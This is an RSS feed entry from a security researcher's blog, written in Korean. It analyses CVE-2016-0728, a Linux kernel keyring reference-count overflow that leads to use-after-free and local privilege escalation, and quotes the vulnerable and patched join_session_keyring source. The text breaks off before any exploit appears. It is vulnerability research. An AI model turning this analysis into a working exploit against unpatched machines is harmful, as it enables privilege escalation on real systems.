<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>rvkhunLab</title>
    <link>https://pwnkidhn.github.io/</link>
    
    <atom:link href="https://pwnkidhn.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Security Researcher / CTF Player</description>
    <pubDate>Sat, 25 Sep 2021 17:22:24 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>CVE-2016-0728</title>
      <link>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</link>
      <guid>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</guid>
      <pubDate>Mon, 02 Nov 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;CVE-2016-0728 // Linux Kernel 1-day &lt;/center&gt;



&lt;h1 id=&quot;information&quot;&gt;&lt;a href=&quot;#information&quot; class=&quot;headerlink&quot; title=&quot;information&quot;&gt;&lt;/a&gt;information&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png&quot; alt=&quot;제목 없음&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.&lt;/li&gt;
&lt;li&gt;취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.</description>
      
      
      
      <content:encoded><![CDATA[<center>CVE-2016-0728 // Linux Kernel 1-day </center><h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p><img src="https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png" alt="제목 없음"></p><ul><li>2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.</li><li>이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.</li><li>당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.</li><li>취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.<span id="more"></span><img src="https://user-images.githubusercontent.com/70257118/95419567-d4718d80-0974-11eb-97dc-8b0e95991573.png" alt="1"></li><li>취약점이 발생하는 환경은 다음과 같으며,  ubuntu 14.04 LTS 환경에서 증명해 보겠다.</li></ul><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><h3 id="Integer-Overflow-trigger"><a href="#Integer-Overflow-trigger" class="headerlink" title="- Integer Overflow (trigger)"></a>- Integer Overflow (trigger)</h3><h3 id="Use-after-free-exploit"><a href="#Use-after-free-exploit" class="headerlink" title="- Use after free (exploit)"></a>- Use after free (exploit)</h3><ul><li>Integer Overflow 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</li><li><code>keyctl</code>은 리눅스의 <code>key</code>를 보유 및 관리하는 시스템이다.</li><li>keyring은 다른 key(다른 keyring을 포함할 수 있음)에 대한 링크가 포함된 특별한 유형의 key다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95422776-e48c6b80-097a-11eb-8eb9-d4f58ca5955e.png" alt="2"></p><ul><li>key는 암호 데이터, 인증 토큰에 대한 구조체이며 아래와 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> &#123;</span></span><br><span class="line">      <span class="keyword">atomic_t</span>                 usage;       <span class="comment">/* number of references */</span></span><br><span class="line">      <span class="keyword">key_serial_t</span>           serial;        <span class="comment">/* key serial number */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span>      *<span class="title">type</span>;</span>        <span class="comment">/* type of key */</span></span><br><span class="line">      <span class="keyword">time_t</span>                     expiry;  <span class="comment">/* time at which key expires (or 0) */</span></span><br><span class="line">      <span class="keyword">uid_t</span>                       uid;           <span class="comment">/* UID */</span></span><br><span class="line">      <span class="keyword">gid_t</span>                       gid;           <span class="comment">/* GID */</span></span><br><span class="line">      <span class="keyword">key_perm_t</span>            perm;        <span class="comment">/* access permissions */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       quotalen;   <span class="comment">/* length added to quota */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       datalen;     <span class="comment">/* payload data length</span></span><br><span class="line"><span class="comment">      char                      *description;</span></span><br><span class="line"><span class="comment">      union &#123;</span></span><br><span class="line"><span class="comment">          unsigned long             value;</span></span><br><span class="line"><span class="comment">          void                            *data;</span></span><br><span class="line"><span class="comment">          struct keyring_list       *subscriptions;</span></span><br><span class="line"><span class="comment">      &#125; payload;                                 /* Actual security data */</span></span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/98777101-80eed580-2433-11eb-8d64-248ab5469aa7.png" alt="1"></p><ul><li><p>해당 취약점에서 중요한 변수는 <code>key-&gt;usage</code>이다.</p></li><li><p><strong>key-&gt;usage의 type은 atomic_t형으로 이는 int형과 같다.</strong></p></li><li><p>취약점이 발생하는 함수는 <code>join_session_keyring</code>이다.</p></li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95425267-fa039480-097e-11eb-87b5-4820e5629540.png" alt="55"></p><ul><li><p>keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)을 이용하여 현재의 세션에서 새로운 keyring을 생성할 수 있다.</p></li><li><p>name이 NULL일 경우 익명, NULL 이 아닐경우 해당 keyring에 이름을 지정할 수 있다.</p></li><li><p>keyring은 같은 이름의 keyring을 참조하여 서로 다른 프로세스에서 공유할 수 있다.</p></li><li><p>만약 하나의 keyring이 여러 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 객체의 내부 reference count가 계속해서 증가하게 된다.</p></li></ul><h2 id="source-code-before-the-vulnerability-is-patched"><a href="#source-code-before-the-vulnerability-is-patched" class="headerlink" title="source code, before the vulnerability is patched"></a>source code, before the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="source-code-after-the-vulnerability-is-patched"><a href="#source-code-after-the-vulnerability-is-patched" class="headerlink" title="source code, after the vulnerability is patched"></a>source code, after the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial;</span><br><span class="line">key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="the-difference-between-these-code"><a href="#the-difference-between-these-code" class="headerlink" title="the difference between these code"></a>the difference between these code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Before</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//After</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, else if 문에서 goto error2이전에 key_put(keyring)이라는 코드가 추가되었다.<h3 id="key-put"><a href="#key-put" class="headerlink" title="key_put()"></a>key_put()</h3></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_put</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="keyword">if</span> (refcount_dec_and_test(&amp;key-&gt;usage))</span><br><span class="line">schedule_work(&amp;key_gc_work);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(key_put);</span><br></pre></td></tr></table></figure><ul><li><p>key_put 함수는 해당 keyring의 usage (<code>reference count</code>) 를 감소시키는 역할을 한다.</p></li><li><p>추가적으로 <code>reference count</code>가 0이 되어 더이상 사용되지 않는 메모리가 된다면, 해당 포인터를 리눅스의 Garbage Colllector가 free 시킨다.</p></li></ul><h1 id="source-code-analysis"><a href="#source-code-analysis" class="headerlink" title="source code analysis"></a>source code analysis</h1><ul><li>join_session_keyring 함수를 크게 세 부분으로 나눠서 분석하겠다.<h2 id="part-1-cred-구조체-초기화"><a href="#part-1-cred-구조체-초기화" class="headerlink" title="part 1 : cred 구조체 초기화"></a>part 1 : cred 구조체 초기화</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring 함수가 호출되면 prepare_creds()함수를 통해 수정용 cred 구조체 new를 초기화 해준다.</li><li>current_cred()를 통해 현재 작업의 subjective credentials를 액세스 한다.</li></ul><h3 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h3><p><img src="https://user-images.githubusercontent.com/70257118/98334793-07c43c80-2047-11eb-98a0-adaaee9c304d.png" alt="제목 없음"></p><ul><li>Task의 creds는 직접적으로 수정할 수 없어 반드시 copy 후 수정해야 한다.</li><li>prepare_creds()를 호출하여 copy를 준비 한다. (new = prepare_creds())</li><li>수정 후 commit_creds()를 호출하여 커밋한다. (commit_creds(new))</li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">validate_process_creds();</span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring); </span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> 수정용 cred 구조체를 만들어 return 해준다.</li></ul><h3 id="what-is-struct-cred"><a href="#what-is-struct-cred" class="headerlink" title="what is struct cred?"></a>what is struct cred?</h3><p><img src="https://user-images.githubusercontent.com/70257118/98340730-2cbdad00-2051-11eb-8409-1ff1950ac625.png" alt="1"></p><ul><li>Credentials : 자격증명</li><li>Linux에서는 다음과 같은 Credentials들을 <code>struct cred</code>를 통해 관리한다.<br>  Traditional UNIX credentials.<br>  Capabilities.<br>  Secure management flags (securebits).<br>  Keys and keyrings.<br>  LSM<br>  AF_KEY </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* 